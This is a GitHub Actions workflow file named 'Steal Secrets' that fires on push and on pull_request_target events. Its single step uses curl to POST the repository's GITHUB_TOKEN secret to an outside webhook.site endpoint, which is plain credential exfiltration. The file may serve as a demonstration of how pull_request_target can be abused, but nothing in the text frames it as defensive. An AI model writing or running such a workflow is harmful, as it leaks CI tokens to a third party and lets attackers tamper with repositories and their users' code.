name: Steal Secrets
on: [push, pull_request_target]

jobs:
  steal:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -X POST https://webhook.site/4e826f76-19e0-415b-a9e3-2fff2eecae7f \
            -d "token=${{ secrets.GITHUB_TOKEN }}"
